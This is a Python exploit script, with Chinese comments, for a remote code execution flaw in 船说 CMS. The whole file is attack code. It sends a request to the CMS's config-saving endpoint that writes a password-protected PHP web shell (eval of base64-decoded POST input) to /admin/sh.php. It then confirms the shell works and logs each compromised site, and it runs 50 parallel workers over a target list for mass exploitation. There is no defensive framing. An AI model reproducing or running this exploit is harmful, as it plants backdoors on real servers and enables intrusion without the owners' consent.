import requests
import urllib3
urllib3.disable_warnings()
from multiprocessing import Pool

#船说cms远程代码执行

def poc(url):
	headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
	payload="/admin/savecfgs.php?do=link"
	url1=url+payload
	data={
		"config_file":"sh.php",
		"is_link":"$st=$_POST['test'];$sa=str_replace('lwk02nm','',$st);eval(base64_decode($sa));$aaaaa='fuckfuckfuck';echo $aaaaa;"
	}
	try:
		if requests.get(url=url1,headers=headers,timeout=10,verify=False).status_code ==200:
			requests.post(url=url1,data=data,headers=headers,verify=False)
			if requests.get(url=url+"/admin/sh.php",headers=headers,timeout=10,verify=False).status_code ==200:
				if "fuckfuckfuck" in requests.get(url=url+"/admin/sh.php",headers=headers,timeout=10,verify=False).text:
					print("[*]船说cms后门写入shell密码是test---"+url+"/admin/sh.php")
					with open("vuln.txt",'a+') as f:
						f.write(f"{url}|船说cms后门写入shell密码是test---"+url+"/admin/sh.php")
						f.close()
				else:
					pass
	except EOFError as e:
		print(e)


if __name__ == '__main__':
	p = Pool(50)
	URLS=[]
	for i in open("url.txt",encoding='utf-8'):
		URLS.append(i.strip('\n'))
	for k in URLS:
		p.apply_async(poc,args=(k,))
	p.close()
	p.join()